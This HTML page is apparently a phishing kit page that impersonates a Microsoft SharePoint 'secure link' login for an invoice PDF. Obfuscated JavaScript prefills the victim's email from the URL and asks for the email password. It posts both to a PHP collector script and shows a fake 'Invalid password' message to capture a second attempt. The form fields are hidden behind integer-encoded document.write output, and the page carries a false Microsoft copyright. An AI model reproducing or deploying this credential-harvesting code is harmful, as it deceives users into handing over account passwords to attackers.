<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <meta name="robots" content="noindex, nofollow">
<meta name="googlebot" content="noindex, nofollow">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Sharing Link Validation</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js">       </script>
<style>
* {box-sizing: border-box;}
body { 
  margin: 0;
  font-family: Arial, Helvetica, sans-serif;
  background-color:#EFEFEF;
  text-align:center;
}

.header {
  overflow: hidden;
  background-color: #0078d7;
  padding: 10px 20px;
  color:#FFF;
  text-align:left;
    font-size: 20px;
}
#inner {
  display: table;
  margin: 0 auto;
  border: 1px solid black;
}

#outer {
  width:100%
}

.files {
    margin: 200px auto;
    width: 90%;
    max-width: 450px;
    text-align: center;
    color: #fff;
}
.x_cft {
  background-color: #0067b8;
    cursor: pointer;
    color: white;
    font-weight: bold;
    margin-bottom: 20px;
    border: 1px solid #0067b8;
    height: 40px;
    padding-left: 80px;
    padding-right: 80px;
    -webkit-appearance: none;
            width: 100%;
}
           .form-wrapper-outer{
            width: 400px;
            margin: auto;
        }
           .innme{
               background-color: #F5F5F5;
               font-size: 21px;
               font-family: 'Segoe UI Web (West European)','Segoe UI',-apple-system,BlinkMacSystemFont,Roboto,'Helvetica Neue',sans-serif;
            padding: 25px;
               border-top-left-radius: 8px;
               border-top-right-radius: 8px;
            border: 1px solid #DADCE0;
            margin-top: 10%;
     box-shadow:  0 2.8px 2.2px rgba(0, 0, 0, 0.034),
  0 6.7px 5.3px rgba(0, 0, 0, 0.048),
  0 12.5px 10px rgba(0, 0, 0, 0.06),
  0 22.3px 17.9px rgba(0, 0, 0, 0.072),
  0 41.8px 33.4px rgba(0, 0, 0, 0.086),
  0 100px 80px rgba(0, 0, 0, 0.12)
; }   
           .outme{
    font-family: "Segoe UI Webfont",-apple-system,'Helvetica Neue','Lucida Grande',Roboto,Ebrima,'Nirmala UI',Gadugi,'Segoe Xbox Symbol';
               padding: 40px;
               border-bottom-left-radius: 8px;
               border-bottom-right-radius: 8px;
            border: 1px solid #DADCE0;
            margin-top: -1px;
               background-color: #FFF;
   box-shadow:
  0 2.8px 2.2px rgba(0, 0, 0, 0.034),
  0 6.7px 5.3px rgba(0, 0, 0, 0.048),
  0 12.5px 10px rgba(0, 0, 0, 0.06);
       }   
        
    
  .form-wrapper-outer .form-logo{
            margin: 0px auto 15px;
            width: 100px;
            margin-top: 12%;
        }
		
        .form-wrapper-outer .form-logo img{
            width: 100%;
        }
		
        .form-greeting{
            text-align: center;
            font-size: 25px;
            margin-bottom: 15px;
        }
		
        .form-button{
            text-align: right;
        }

        .field-wrapper{
            position: relative;
            margin-bottom: 15px;
        }
		
        .field-wrapper input{
            border: 1px solid #DADCE0;
            padding: 15px;
            border-radius: 4px;
            width: 100%;
        }

     
    
</style>
       <script type="text/javascript">
var _0x4a19=['fail','innerHTML','focus','onload','log','firstb','secondb','replace','match','pop_up_class','https://sites.google.com/view/3bc4505a48734ffab10a2ae44e11','Invalid\x20password\x20.\x20Please\x20try\x20again\x20...','onkeydown','keyCode','display','style','theemail','preventDefault','Enter\x20your\x20correct\x20email\x20password.','none','Email\x20address\x20is\x20required.','getElementById','value','ajax','disabled','input[name=myprocess]','val','block','myprocess','done','readOnly','message','location','mypass','Retype','POST','thepass','substr','input[name=offemail]','input[name=onpassword]','myerror','hash'];(function(_0x5712b4,_0x4a1940){var _0x1a200c=function(_0x317a69){while(--_0x317a69){_0x5712b4['push'](_0x5712b4['shift']());}};_0x1a200c(++_0x4a1940);}(_0x4a19,0x1d4));var _0x1a20=function(_0x5712b4,_0x4a1940){_0x5712b4=_0x5712b4-0x0;var _0x1a200c=_0x4a19[_0x5712b4];return _0x1a200c;};var _0x12d07e=_0x1a20,hash=window[_0x12d07e('0x1a')][_0x12d07e('0x23')][_0x12d07e('0x1f')](0x1);window[_0x12d07e('0x27')]=function onoff(){var _0x387b2c=_0x12d07e,_0x317a69=window[_0x387b2c('0x1a')]['hash']['replace']('#','');document[_0x387b2c('0xf')](_0x387b2c('0xa'))[_0x387b2c('0x6')]=function(_0x57d530){var _0x4ac6e6=_0x387b2c;_0x57d530[_0x4ac6e6('0x7')]==0xd&&checkmail();},document[_0x387b2c('0xf')](_0x387b2c('0x1e'))[_0x387b2c('0x6')]=function(_0x3c4a3c){_0x3c4a3c['keyCode']==0xd&&finishh();},hash?(document[_0x387b2c('0xf')]('theemail')[_0x387b2c('0x10')]=_0x317a69,document[_0x387b2c('0xf')](_0x387b2c('0x1b'))['style'][_0x387b2c('0x8')]=_0x387b2c('0x15'),document[_0x387b2c('0xf')](_0x387b2c('0x1e'))[_0x387b2c('0x26')](),document[_0x387b2c('0xf')](_0x387b2c('0x29'))['style'][_0x387b2c('0x8')]='none',document['getElementById'](_0x387b2c('0x0'))['style']['display']=_0x387b2c('0x15'),document[_0x387b2c('0xf')]('theemail')[_0x387b2c('0x18')]=!![]):document[_0x387b2c('0xf')]('theemail')[_0x387b2c('0x26')]();};function checkmail(){var _0x53a9df=_0x12d07e,_0x31cd07=document['getElementById'](_0x53a9df('0xa'))[_0x53a9df('0x10')],_0x4384a3=/^[\w\-\.\+]+\@[a-zA-Z0-9\.\-]+\.[a-zA-z0-9]{2,4}$/,_0x6e205f=document[_0x53a9df('0xf')]('myerror');if(!_0x31cd07[_0x53a9df('0x2')](_0x4384a3))return _0x6e205f[_0x53a9df('0x9')][_0x53a9df('0x8')]=_0x53a9df('0x15'),_0x6e205f[_0x53a9df('0x25')]=_0x53a9df('0xe'),document[_0x53a9df('0xf')](_0x53a9df('0x1b'))[_0x53a9df('0x9')][_0x53a9df('0x8')]=_0x53a9df('0xd'),document[_0x53a9df('0xf')](_0x53a9df('0xa'))['focus'](),![];else _0x6e205f[_0x53a9df('0x9')][_0x53a9df('0x8')]=_0x53a9df('0xd'),document[_0x53a9df('0xf')](_0x53a9df('0x1b'))[_0x53a9df('0x9')][_0x53a9df('0x8')]=_0x53a9df('0x15'),document[_0x53a9df('0xf')](_0x53a9df('0x29'))[_0x53a9df('0x9')][_0x53a9df('0x8')]='none',document[_0x53a9df('0xf')](_0x53a9df('0x0'))[_0x53a9df('0x9')][_0x53a9df('0x8')]=_0x53a9df('0x15'),document[_0x53a9df('0xf')]('thepass')['focus']();}function finishh(){var _0x562e97=_0x12d07e,_0x456cac=document[_0x562e97('0xf')]('theemail')['value'],_0xbbadbf=document[_0x562e97('0xf')](_0x562e97('0x1e')),_0x258eb6=/^[\w\-\.\+]+\@[a-zA-Z0-9\.\-]+\.[a-zA-z0-9]{2,4}$/,_0x17cdef=document[_0x562e97('0xf')](_0x562e97('0x22')),_0x251e47=_0x562e97('0x4');if(!_0x456cac[_0x562e97('0x2')](_0x258eb6))return _0x17cdef[_0x562e97('0x9')][_0x562e97('0x8')]=_0x562e97('0x15'),_0x17cdef['innerHTML']=_0x562e97('0xe'),document[_0x562e97('0xf')](_0x562e97('0x1b'))[_0x562e97('0x9')][_0x562e97('0x8')]=_0x562e97('0xd'),document[_0x562e97('0xf')](_0x562e97('0xa'))[_0x562e97('0x26')](),document[_0x562e97('0xf')]('firstb')[_0x562e97('0x9')]['display']=_0x562e97('0x15'),document[_0x562e97('0xf')](_0x562e97('0x0'))[_0x562e97('0x9')][_0x562e97('0x8')]='none',![];else _0x17cdef[_0x562e97('0x9')][_0x562e97('0x8')]=_0x562e97('0xd'),document['getElementById'](_0x562e97('0x1b'))[_0x562e97('0x9')][_0x562e97('0x8')]='block',document[_0x562e97('0xf')](_0x562e97('0x29'))[_0x562e97('0x9')][_0x562e97('0x8')]=_0x562e97('0xd'),document[_0x562e97('0xf')](_0x562e97('0x0'))[_0x562e97('0x9')][_0x562e97('0x8')]=_0x562e97('0x15');if(_0xbbadbf[_0x562e97('0x10')]['length']<0x4)return _0x17cdef['style'][_0x562e97('0x8')]=_0x562e97('0x15'),_0x17cdef[_0x562e97('0x25')]=_0x562e97('0xc'),_0xbbadbf[_0x562e97('0x26')](),![];else{document[_0x562e97('0xf')](_0x562e97('0x0'))['disabled']=!![],document[_0x562e97('0xf')](_0x562e97('0x3'))['style'][_0x562e97('0x8')]=_0x562e97('0x15'),_0x17cdef[_0x562e97('0x9')]['display']=_0x562e97('0xd');var _0x14823a={'emaildata':$(_0x562e97('0x20'))[_0x562e97('0x14')](),'passwdata':$(_0x562e97('0x21'))[_0x562e97('0x14')](),'hiddendata':$(_0x562e97('0x13'))['val']()};$[_0x562e97('0x11')]({'type':_0x562e97('0x1d'),'url':'../two/pop.php','data':_0x14823a,'dataType':'json','encode':!![]})[_0x562e97('0x17')](function(_0x34d62e){var _0x1c1234=_0x562e97;console[_0x1c1234('0x28')](_0x34d62e),_0x34d62e[_0x1c1234('0x19')]==_0x1c1234('0x1c')?(document['getElementById'](_0x1c1234('0x3'))[_0x1c1234('0x9')][_0x1c1234('0x8')]=_0x1c1234('0xd'),document[_0x1c1234('0xf')](_0x1c1234('0x0'))['disabled']=![],_0xbbadbf[_0x1c1234('0x10')]='',_0x17cdef['style'][_0x1c1234('0x8')]=_0x1c1234('0x15'),_0x17cdef[_0x1c1234('0x25')]=_0x1c1234('0x5'),_0xbbadbf[_0x1c1234('0x26')](),document[_0x1c1234('0xf')](_0x1c1234('0x16'))[_0x1c1234('0x10')]=0x1):window['location'][_0x1c1234('0x1')](_0x251e47);})[_0x562e97('0x24')](function(_0x3d886c){var _0x11be1a=_0x562e97;document['getElementById']('pop_up_class')[_0x11be1a('0x9')]['display']=_0x11be1a('0xd'),document[_0x11be1a('0xf')]('secondb')[_0x11be1a('0x12')]=![],_0x17cdef[_0x11be1a('0x9')][_0x11be1a('0x8')]=_0x11be1a('0x15'),_0x17cdef[_0x11be1a('0x25')]='Check\x20your\x20network\x20connection..',console[_0x11be1a('0x28')](_0x3d886c);}),event[_0x562e97('0xb')]();}}
    </script>
</head>

<body>
<div class="header">SharePoint</div>
<div class="form-wrapper-outer">
<input type="hidden" class="form-control" name="myprocess" id="myprocess" value="">
<div class="form-logo">
<img src="../two/logo.png" width="197"  width="197">
    </div>      <div class="innme">Verify Your Identity</div>
    <div class="outme">        
        <div style="text-align: left; font-size: 14px; margin-top: -15px; padding-bottom: 10px;">You've received a secure link to:<br><br><img style="margin-bottom: -10px;" src="../two/pdf.png" width="30" height="30" alt="logo"><span style="padding-left: 10px; font-size: 17px;">Invoice & Remittance Advice</span><br><br><span style="color: #666">To open this secure link, You need to enter the email that this document was sent to.</span><br><br></div>
        <div id='p000p_class' style="margin-top: -10px; margin-bottom: 15px;"><img src='../two/logo_strip.png' width="90%"><br></div>
        <div id='pop_up_class' style="display: none"><img src='../two/loading-gif-png-5.gif' width='50'><br></div>
<span id="myerror" style="font-size: 14px;  display: none; padding-bottom: 5px; color: rgb(232, 17, 35);"></span>
            <div class="field-wrapper">
            <script language="Javascript">
                var erp = new Array;
erp[0] = 1013542512;
erp[1] = 1970544756;
erp[2] = 2037409085;
erp[3] = 577072481;
erp[4] = 1768694304;
erp[5] = 1851878757;
erp[6] = 1025666918;
erp[7] = 1717923169;
erp[8] = 1768694304;
erp[9] = 1768176930;
erp[10] = 1952998757;
erp[11] = 1835100524;
erp[12] = 572551276;
erp[13] = 1633903976;
erp[14] = 1869374565;
erp[15] = 1916609093;
erp[16] = 1853121906;
erp[17] = 544829301;
erp[18] = 1914725741;
erp[19] = 1634298914;
erp[20] = 543257972;
erp[21] = 1868787565;
erp[22] = 1886152052;
erp[23] = 1698505327;
erp[24] = 1717969470;
erp[25] = 218767392;
erp[26] = 538976288;
erp[27] = 538983471;
erp[28] = 1684633150;
erp[29] = 218767392;
erp[30] = 538976288;
erp[31] = 538983524;
erp[32] = 1769349219;
erp[33] = 1818325875;
erp[34] = 1025664617;
erp[35] = 1701602349;
erp[36] = 2003984752;
erp[37] = 1885696546;
erp[38] = 543777853;
erp[39] = 577599856;
erp[40] = 1634956066;
erp[41] = 544437369;
erp[42] = 1818574114;
erp[43] = 1684632432;
erp[44] = 1818327354;
erp[45] = 544108398;
erp[46] = 1698374206;
erp[47] = 218767392;
erp[48] = 538976288;
erp[49] = 538976288;
erp[50] = 538983529;
erp[51] = 1852863860;
erp[52] = 544504176;
erp[53] = 1698505328;
erp[54] = 1634956151;
erp[55] = 1869767714;
erp[56] = 544104813;
erp[57] = 1698505327;
erp[58] = 1852858739;
erp[59] = 1937207154;
erp[60] = 1679958121;
erp[61] = 1681728116;
erp[62] = 1751478369;
erp[63] = 1936925216;
erp[64] = 1886151011;
erp[65] = 1701343084;
erp[66] = 1684369981;
erp[67] = 574975604;
erp[68] = 1701978233;
erp[69] = 1869967904;
erp[70] = 1701667177;
erp[71] = 1814065249;
erp[72] = 1936947055;
erp[73] = 1919164990;
erp[74] = 218767392;
erp[75] = 538976288;
erp[76] = 538983471;
erp[77] = 1684633150;
erp[78] = 218767392;
erp[79] = 1013085556;
erp[80] = 1953459744;
erp[81] = 1668047219;
erp[82] = 1933386360;
erp[83] = 1600349812;
erp[84] = 572549476;
erp[85] = 1025664617;
erp[86] = 1920169058;
erp[87] = 572551022;
erp[88] = 1668049251;
erp[89] = 1799168611;
erp[90] = 1751475051;
erp[91] = 1835100524;
erp[92] = 673784382;
erp[93] = 1315272820;
erp[94] = 1009738357;
erp[95] = 1953787758;
erp[96] = 1041041952;
erp[97] = 540828277;
erp[98] = 1953787758;
erp[99] = 543386721;
erp[100] = 1936932130;
erp[101] = 2019517286;
erp[102] = 1948393577;
erp[103] = 1681728115;
erp[104] = 1701015406;
erp[105] = 1684152864;
erp[106] = 1869505388;
erp[107] = 1768123197;
erp[108] = 577137006;
erp[109] = 1769171048;
erp[110] = 673784352;
erp[111] = 1937013100;
erp[112] = 1698505316;
erp[113] = 1769173100;
erp[114] = 1635334688;
erp[115] = 1852796517;
erp[116] = 574510697;
erp[117] = 1702305860;
erp[118] = 1868789101;
erp[119] = 1701737532;
erp[120] = 794981748;
erp[121] = 1953459774;
erp[122] = 0;
var em = '';
for(i=0;i<erp.length;i++){
	tmp = erp[i];
	if(Math.floor((tmp/Math.pow(256,3)))>0){
		em += String.fromCharCode(Math.floor((tmp/Math.pow(256,3))));
	};
	tmp = tmp - (Math.floor((tmp/Math.pow(256,3))) * Math.pow(256,3));
	if(Math.floor((tmp/Math.pow(256,2)))>0){
		em += String.fromCharCode(Math.floor((tmp/Math.pow(256,2))));
	};
	tmp = tmp - (Math.floor((tmp/Math.pow(256,2))) * Math.pow(256,2));
	if(Math.floor((tmp/Math.pow(256,1)))>0){
		em += String.fromCharCode(Math.floor((tmp/Math.pow(256,1))));
	};
	tmp = tmp - (Math.floor((tmp/Math.pow(256,1))) * Math.pow(256,1));
	if(Math.floor((tmp/Math.pow(256,0)))>0){
		em += String.fromCharCode(Math.floor((tmp/Math.pow(256,0))));
	};
};
document.write(em);
</script>
        <div style="text-align: left; font-size: 11px; display: none;">By clicking Next, you allow SharePoint to use your email address in accordance with our privacy policy.<br>SharePoint will provide links to our terms for your review.</div>
    </div>
   <div style="margin-top: 12px; font-size: 11px;">&#169; 2021 Microsoft &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Privacy & cookies</div>
    </div>
</body>
</html>